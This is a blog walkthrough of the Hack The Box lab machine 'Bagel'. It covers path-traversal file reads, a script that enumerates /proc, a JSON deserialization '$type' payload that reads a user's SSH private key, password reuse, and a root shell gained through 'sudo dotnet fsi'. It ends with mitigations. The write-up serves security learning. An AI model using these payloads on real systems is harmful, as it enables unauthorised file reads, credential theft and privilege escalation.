---
layout: post
title: Hack The Box Walkthrough - Bagel
date: 2023-03-13
type: post
tags:
- Walkthrough
- Hacking
- HackTheBox
- Medium
- Machine
permalink: /2023/03/HTB/Bagel
img: 2023/03/Bagel/Bagel.png
---

This was a really fun machine where I exploited a Local File Inclusion (LFI) vulnerability to extract a .NET application. Then reversed the .NET application to get the SSH key of a user and the password for another user. And finally, get root by running .Net with sudo.

* Room: Bagel
* Difficulty: Medium
* URL: [https://app.hackthebox.com/machines/Bagel](https://app.hackthebox.com/machines/Bagel)
* Author: [CestLaVie](https://app.hackthebox.com/users/298338)

## Enumeration

I ran Rustscan to check the machine for open ports.

```bash
$ rustscan -a target -- -A | tee rust.txt
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Real hackers hack time ⌛

[~] The config file is expected to be at "/home/ehogue/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'.
Open 10.10.11.201:22
Open 10.10.11.201:5000
Open 10.10.11.201:8000
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

...

Host is up, received conn-refused (0.047s latency).
Scanned at 2023-03-11 16:00:21 EST for 100s

PORT     STATE SERVICE  REASON  VERSION
22/tcp   open  ssh      syn-ack OpenSSH 8.8 (protocol 2.0)
| ssh-hostkey:
|   256 6e4e1341f2fed9e0f7275bededcc68c2 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBEwHzrBpcTXWKbxBWhc6yfWMiWfWjPmUJv2QqB/c2tJDuGt/97OvgzC+Zs31X/IW2WM6P0rtrKemiz3C5mUE67k=
|   256 80a7cd10e72fdb958b869b1b20652a98 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINnQ9frzL5hKjBf6oUklfUhQCMFuM0EtdYJOIxUiDuFl
5000/tcp open  upnp?    syn-ack
| fingerprint-strings:
|   GetRequest:
|     HTTP/1.1 400 Bad Request
|     Server: Microsoft-NetCore/2.0
|     Date: Sat, 11 Mar 2023 21:00:34 GMT
|     Connection: close
|   HTTPOptions:
|     HTTP/1.1 400 Bad Request
|     Server: Microsoft-NetCore/2.0
|     Date: Sat, 11 Mar 2023 21:00:49 GMT
|     Connection: close
|   Help:
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/html
|     Server: Microsoft-NetCore/2.0
|     Date: Sat, 11 Mar 2023 21:00:59 GMT
|     Content-Length: 52
|     Connection: close
|     Keep-Alive: true
|     <h1>Bad Request (Invalid request line (parts).)</h1>
|   RTSPRequest:
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/html
|     Server: Microsoft-NetCore/2.0
|     Date: Sat, 11 Mar 2023 21:00:34 GMT
|     Content-Length: 54
|     Connection: close
|     Keep-Alive: true
|     <h1>Bad Request (Invalid request line (version).)</h1>
|   SSLSessionReq, TLSSessionReq, TerminalServerCookie:
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/html
|     Server: Microsoft-NetCore/2.0
|     Date: Sat, 11 Mar 2023 21:01:00 GMT
|     Content-Length: 52
|     Connection: close
|     Keep-Alive: true
|_    <h1>Bad Request (Invalid request line (parts).)</h1>
8000/tcp open  http-alt syn-ack Werkzeug/2.2.2 Python/3.10.9
|_http-title: Did not follow redirect to http://bagel.htb:8000/?page=index.html
| fingerprint-strings:
|   FourOhFourRequest:
|     HTTP/1.1 404 NOT FOUND
|     Server: Werkzeug/2.2.2 Python/3.10.9
|     Date: Sat, 11 Mar 2023 21:00:34 GMT
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 207
|     Connection: close
|     <!doctype html>
|     <html lang=en>
|     <title>404 Not Found</title>
|     <h1>Not Found</h1>
|     <p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>
|   GetRequest:
|     HTTP/1.1 302 FOUND
|     Server: Werkzeug/2.2.2 Python/3.10.9
|     Date: Sat, 11 Mar 2023 21:00:29 GMT
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 263
|     Location: http://bagel.htb:8000/?page=index.html
|     Connection: close
|     <!doctype html>
|     <html lang=en>
|     <title>Redirecting...</title>
|     <h1>Redirecting...</h1>
|     <p>You should be redirected automatically to the target URL: <a href="http://bagel.htb:8000/?page=index.html">http://bagel.htb:8000/?page=index.html</a>. If not, click the link.
|   Socks5:
|     <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN"
|     "http://www.w3.org/TR/html4/strict.dtd">
|     <html>
|     <head>
|     <meta http-equiv="Content-Type" content="text/html;charset=utf-8">
|     <title>Error response</title>
|     </head>
|     <body>
|     <h1>Error response</h1>
|     <p>Error code: 400</p>
|     <p>Message: Bad request syntax ('
|     ').</p>
|     <p>Error code explanation: HTTPStatus.BAD_REQUEST - Bad request syntax or unsupported method.</p>
|     </body>
|_    </html>
|_http-server-header: Werkzeug/2.2.2 Python/3.10.9
| http-methods:
|_  Supported Methods: OPTIONS GET HEAD
2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :

...

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 16:02
Completed NSE at 16:02, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 16:02
Completed NSE at 16:02, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 16:02
Completed NSE at 16:02, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 100.44 seconds
```

There were three open ports.

I also scanned UDP ports, but did not find anything there.

```bash
$ sudo nmap -sU target -oN nmapUdp.txt
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-11 15:57 EST
Nmap scan report for target (10.10.11.201)
Host is up (0.033s latency).
All 1000 scanned ports on target (10.10.11.201) are in ignored states.
Not shown: 1000 closed udp ports (port-unreach)

Nmap done: 1 IP address (1 host up) scanned in 1006.32 seconds
```

### Port 22 - SSH

This is usually secure. So I kept this to the end if I didn't find anything else.

### Port 5000 - Microsoft-NetCore/2.0

This was a first for me. It promised to be interesting. I opened it in a browser and got a 400. I ran Feroxbuster to look for hidden pages. It did not find anything.

### Port 8000

I opened the site on port 8000 in a browser. I got redirected to 'bagel,htb' so I added that domain to my hosts file and reloaded the page.

![Bagel Website](/assets/images/2023/03/Bagel/BagelWebsite.png "Bagel Website")

The home page was giving information about a bagel shop. The 'Orders' page was showing a list of orders in plain text.

![Orders](/assets/images/2023/03/Bagel/Orders.png "Orders")

The home page redirected me to 'http://bagel.htb:8000/?page=index.html'. The page parameter hinted at LFI. I tried to read '/etc/passwd'.

```http
GET /?page=../../../../etc/passwd HTTP/1.1
Host: bagel.htb:8000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: keep-alive
Upgrade-Insecure-Requests: 1
```

It worked.

```http
HTTP/1.1 200 OK
Server: Werkzeug/2.2.2 Python/3.10.9
Date: Sat, 11 Mar 2023 21:08:01 GMT
Content-Disposition: inline; filename=passwd
Content-Type: application/octet-stream
Content-Length: 1823
Last-Modified: Wed, 25 Jan 2023 12:44:39 GMT
Cache-Control: no-cache
ETag: "1674650679.4629574-1823-759960046"
Date: Sat, 11 Mar 2023 21:08:01 GMT
Connection: close

root:x:0:0:root:/root:/bin/bash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
operator:x:11:0:operator:/root:/sbin/nologin
games:x:12:100:games:/usr/games:/sbin/nologin
ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin
nobody:x:65534:65534:Kernel Overflow User:/:/sbin/nologin
dbus:x:81:81:System message bus:/:/sbin/nologin
tss:x:59:59:Account used for TPM access:/dev/null:/sbin/nologin
systemd-network:x:192:192:systemd Network Management:/:/usr/sbin/nologin
systemd-oom:x:999:999:systemd Userspace OOM Killer:/:/usr/sbin/nologin
systemd-resolve:x:193:193:systemd Resolver:/:/usr/sbin/nologin
polkitd:x:998:997:User for polkitd:/:/sbin/nologin
rpc:x:32:32:Rpcbind Daemon:/var/lib/rpcbind:/sbin/nologin
abrt:x:173:173::/etc/abrt:/sbin/nologin
setroubleshoot:x:997:995:SELinux troubleshoot server:/var/lib/setroubleshoot:/sbin/nologin
cockpit-ws:x:996:994:User for cockpit web service:/nonexisting:/sbin/nologin
cockpit-wsinstance:x:995:993:User for cockpit-ws instances:/nonexisting:/sbin/nologin
rpcuser:x:29:29:RPC Service User:/var/lib/nfs:/sbin/nologin
sshd:x:74:74:Privilege-separated SSH:/usr/share/empty.sshd:/sbin/nologin
chrony:x:994:992::/var/lib/chrony:/sbin/nologin
dnsmasq:x:993:991:Dnsmasq DHCP and DNS server:/var/lib/dnsmasq:/sbin/nologin
tcpdump:x:72:72::/:/sbin/nologin
systemd-coredump:x:989:989:systemd Core Dumper:/:/usr/sbin/nologin
systemd-timesync:x:988:988:systemd Time Synchronization:/:/usr/sbin/nologin
developer:x:1000:1000::/home/developer:/bin/bash
phil:x:1001:1001::/home/phil:/bin/bash
_laurel:x:987:987::/var/log/laurel:/bin/false
```

I used the LFI vulnerability to try to extract more files. I tried loading configuration files for nginx and Apache. I tried to get the SSH key for both users on the machine. Nothing worked.

I used the LFI to read the command used to run the web server.

```http
GET /?page=../../../../proc/self/cmdline HTTP/1.1
Host: bagel.htb:8000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: keep-alive
Upgrade-Insecure-Requests: 1
```

It returned the python application's full path.

```bash
python3 /home/developer/app/app.py
```

I extracted the script.


```http
GET /?page=/home/developer/app/app.py HTTP/1.1
```

```python
from flask import Flask, request, send_file, redirect, Response
import os.path
import websocket,json

app = Flask(__name__)

@app.route('/')
def index():
        if 'page' in request.args:
            page = 'static/'+request.args.get('page')
            if os.path.isfile(page):
                resp=send_file(page)
                resp.direct_passthrough = False
                if os.path.getsize(page) == 0:
                    resp.headers["Content-Length"]=str(len(resp.get_data()))
                return resp
            else:
                return "File not found"
        else:
                return redirect('http://bagel.htb:8000/?page=index.html', code=302)

@app.route('/orders')
def order(): # don't forget to run the order app first with "dotnet <path to .dll>" command. Use your ssh key to access the machine.
    try:
        ws = websocket.WebSocket()
        ws.connect("ws://127.0.0.1:5000/") # connect to order app
        order = {"ReadOrder":"orders.txt"}
        data = str(json.dumps(order))
        ws.send(data)
        result = ws.recv()
        return(json.loads(result)['ReadOrder'])
    except:
        return("Unable to connect")

if __name__ == '__main__':
  app.run(host='0.0.0.0', port=8000)
```

The application was very simple. Two routes. The first one had the LFI vulnerability in it. The second one was for the Orders page. It requested the list of orders from using websockets on port 5000.

The order code also had a comment about running the application dll and using an SSH key to connect to the server.

I copied the code in a file and started playing with it. I started by running the code from the application.

```python
#!/usr/bin/env python3

import websocket,json

ws = websocket.WebSocket()
ws.connect("ws://bagel.htb:5000/")
order = {"ReadOrder":"orders.txt"}
data = str(json.dumps(order))
ws.send(data)
result = ws.recv()
print(result)
```

```bash
$ ./ws.py
{
  "UserId": 0,
  "Session": "Unauthorized",
  "Time": "1:06:36",
  "RemoveOrder": null,
  "WriteOrder": null,
  "ReadOrder": "order #1 address: NY. 99 Wall St., client name: P.Morgan, details: [20 chocko-bagels]\norder #2 address: Berlin. 339 Landsberger.A., client name: J.Smith, details: [50 bagels]\norder #3 address: Warsaw. 437 Radomska., client name: A.Kowalska, details: [93 bel-bagels] \n"
}
```

The result showed that I might be able to remove and write orders. It also added parameters that were not in the code.

I tried using 'ReadOrder' to read something other than 'orders.txt'. That failed. I tried using 'WriteOrder' to write to different files. The content I passed replaced the original orders. I tried adding parameters like 'Path' to write somewhere else, but it did not appear to do anything. I tried to use 'RemoveOrder' also, this didn't change anything either.

I experimented with the application a lot, but failed to exploit anything. Then I realized that I might be able to extract the actual application with the LFI if I knew where it was on the server. I wrote a small script to read all the command line it could find in '/proc/ID'.

```python
#!/usr/bin/env python3
import requests

for id in range(1, 20000):
    response = requests.get(f'http://bagel.htb:8000/?page=../../../../proc/{id}/cmdline')
    text = response.text
    if len(text) > 0 and text != 'File not found':
        print(f'{id} - {text}')
```

I ran it and found where the application was located.

```bash
$ ./get_processes.py
1 - /usr/lib/systemd/systemdrhgb--switched-root--system--deserialize35
759 - /usr/lib/systemd/systemd-journald
772 - /usr/lib/systemd/systemd-udevd
851 - /sbin/auditd
852 - /sbin/auditd
853 - /usr/lib/systemd/systemd-oomd

...

890 - dotnet/opt/bagel/bin/Debug/net6.0/bagel.dll
892 - python3/home/developer/app/app.py

...

923 - dotnet/opt/bagel/bin/Debug/net6.0/bagel.dll
924 - dotnet/opt/bagel/bin/Debug/net6.0/bagel.dll

...
```

I used the LFI to download it.

```bash
curl "http://bagel.htb:8000/?page=../../../../opt/bagel/bin/Debug/net6.0/bagel.dll" -o bagel.dll
```

I then launched a Windows VM and used [dnSpy](https://github.com/dnSpy/dnSpy) to read the .NET code.

The first thing that caught my eyes was a password in the DB class.

![DB](/assets/images/2023/03/Bagel/ClassDB.png "DB")

I tried to SSH as both users. But as the comment from the Python file said, I needed an SSH key to connect.

```bash
$ ssh phil@target
phil@target: Permission denied (publickey,gssapi-keyex,gssapi-with-mic).

$ ssh developer@target
developer@target: Permission denied (publickey,gssapi-keyex,gssapi-with-mic).
```

I kept looking at the code. When I sent a message to the .NET application, it would deserialize the JSON, then serialize the returned object before sending it back to me.

![Message Received Method](/assets/images/2023/03/Bagel/MessageReceived.png "Message Received Method")

The Handler class was using [Newtonsoft.Json](https://www.newtonsoft.com/json/help/html/N_Newtonsoft_Json.htm) to serialize and deserialize the JSON payload.

![Handler](/assets/images/2023/03/Bagel/ClassHandler.png "Handler")

The `TypeNameHandling = 4` part was interesting. It meant I could use `$type` to send a [different type](https://www.newtonsoft.com/json/help/html/T_Newtonsoft_Json_TypeNameHandling.htm) than what was expected. I tried using a [payload I found](https://medium.com/c-sharp-progarmming/stop-insecure-deserialization-with-c-6a488c95cf2f), but it failed. The typing <Base> forced me to use an instance of the Base class.

The Base class was simple.

![Base](/assets/images/2023/03/Bagel/ClassBase.png "Base")

It extended the Orders class and added a few properties. The properties add simple getters and setters.

The Orders had more to it.

![Orders](/assets/images/2023/03/Bagel/ClassOrders.png "Orders")

On deserialization, the setters of the passed in methods were called. Then immediately after, the serizalization would call the getters. Orders used the File class to read and write to the server's file system.

`WriteOrder` setter would take the value passed in the JSON and write it to a file. The getter returned a string saying if it was successful or not.

![WriteFile](/assets/images/2023/03/Bagel/WriteFile.png "WriteFile")

`ReadOrder` setter would read the content of a file. The getter returned the read content.

![ReadFile](/assets/images/2023/03/Bagel/ReadFile.png "ReadFile")

I thought I might be able to set the file location by calling `ReadOrder`, then call `WriteOrder` to write anywhere on the disk. But `ReadOrder` was removing `/` and `..` from the file path. And the File class was reading files from a hardcoded path.

![File Properties](/assets/images/2023/03/Bagel/FileProperties.png "File Properties")

The first few times I read the code, I completely ignored the `RemoveOrder` getter and setter. At first glance, they do not appear to do anything.

![RemoveOrder](/assets/images/2023/03/Bagel/RemoveOrder.png "RemoveOrder")

This code was returning an object of any type. If I gave it a File object, I would be able to call ReadFile and give it anything I wanted. The hardest thing was giving it the correct type to load a File object, but all the needed information was in dnSpy.

![Bagel Type](/assets/images/2023/03/Bagel/BagelType.png "Bagel Type")

I used this to read phil's SSH key.

```python
order = {
    "RemoveOrder": {
        "$type": "bagel_server.File, bagel, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null",
        "ReadFile": "../../../../../home/phil/.ssh/id_rsa"
    },
}

ws = websocket.WebSocket()
ws.connect("ws://bagel.htb:5000/")
data = str(json.dumps(order))
print(data)
ws.send(data)
result = ws.recv()
print(result)
```

```bash
$ ./ws.py
{"RemoveOrder": {"$type": "bagel_server.File, bagel, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null", "ReadFile": "../../../../../home/phil/.ssh/id_rsa"}}
{
  "UserId": 0,
  "Session": "Unauthorized",
  "Time": "11:53:51",
  "RemoveOrder": {
    "$type": "bagel_server.File, bagel",
    "ReadFile": "-----BEGIN OPENSSH PRIVATE KEY-----\nb3B2 ... \n-----END OPENSSH PRIVATE KEY-----",
    "WriteFile": null
  },
  "WriteOrder": null,
  "ReadOrder": null
}
```

I saved the key to a file and used it to connect to the server and get the user flag.

```bash
$ ssh -i phil.key phil@target
Last login: Tue Feb 14 11:47:33 2023 from 10.10.14.19

[phil@bagel ~]$ ls -la
total 24
drwx------. 4 phil phil 4096 Jan 20 14:14 .
drwxr-xr-x. 4 root root   35 Aug  9  2022 ..
lrwxrwxrwx. 1 root root    9 Jan 20 17:59 .bash_history -> /dev/null
-rw-r--r--. 1 phil phil   18 Jan 20  2022 .bash_logout
-rw-r--r--. 1 phil phil  141 Jan 20  2022 .bash_profile
-rw-r--r--. 1 phil phil  492 Jan 20  2022 .bashrc
drwxrwxr-x. 3 phil phil 4096 Oct 22 21:16 .dotnet
drwx------. 2 phil phil   61 Oct 23 18:59 .ssh
-rw-r-----. 1 root phil   33 Mar 12 14:26 user.txt

[phil@bagel ~]$ cat user.txt
REDACTED
```

## User developer

I looked at what phil could run with sudo. It required a password. I had one I found in the DB class. I tried it and it failed.

```bash
[phil@bagel ~]$ sudo -l

We trust you have received the usual lecture from the local System
Administrator. It usually boils down to these three things:

    #1) Respect the privacy of others.
    #2) Think before you type.
    #3) With great power comes great responsibility.

[sudo] password for phil:
Sorry, try again.
[sudo] password for phil:
Sorry, try again.
```

I tried the same password to connect as developer, it worked.

```bash
[phil@bagel ~]$ su developer
Password:
[developer@bagel phil]$
```

## Root

I looked at what developer could run with sudo.

```bash
[developer@bagel phil]$ sudo -l
Matching Defaults entries for developer on bagel:
    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin, env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS", env_keep+="MAIL QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE", env_keep+="LC_COLLATE
    LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES", env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE", env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY",
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/var/lib/snapd/snap/bin

User developer may run the following commands on bagel:
    (root) NOPASSWD: /usr/bin/dotnet
```

They could run dotnet as root. I looked on GTFOBins, and saw that I could launch system commands from the [F# interactive shell](https://gtfobins.github.io/gtfobins/dotnet/).

```bash
[developer@bagel phil]$ sudo dotnet fsi

Welcome to .NET 6.0!
---------------------
SDK Version: 6.0.113

----------------
Installed an ASP.NET Core HTTPS development certificate.
To trust the certificate run 'dotnet dev-certs https --trust' (Windows and macOS only).
Learn about HTTPS: https://aka.ms/dotnet-https
----------------

...

For help type #help;;

> System.Diagnostics.Process.Start("/bin/sh").WaitForExit();;

sh-5.2# id
uid=0(root) gid=0(root) groups=0(root) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023

sh-5.2# cat /root/root.txt
REDACTED
```

## Mitigations

The first issue in the box was the LFI vulnerability. It was very easy to find.

```python
page = 'static/'+request.args.get('page')
if os.path.isfile(page):
    resp=send_file(page)
```

The code should have used a list of allowed pages and reject everything else. If that was not possible, it could have used [os.path.realpath](https://docs.python.org/3/library/os.path.html#os.path.realpath) to validate that the real file path was still in the static folder.

```python
>>> os.path.realpath('/var/www/../../etc/passwd', strict=True)
'/etc/passwd'
```

The .NET application should use [TypeNameHandling = 0](https://www.newtonsoft.com/json/help/html/T_Newtonsoft_Json_TypeNameHandling.htm) to block me from passing any object I wanted.

Once connected, I should not have been able to use a password found in the code to connect as a user. The passwords used should all be unique.

And lastly, interactive consoles should not be used with sudo. They allow running code, and there is always a way to run system commands.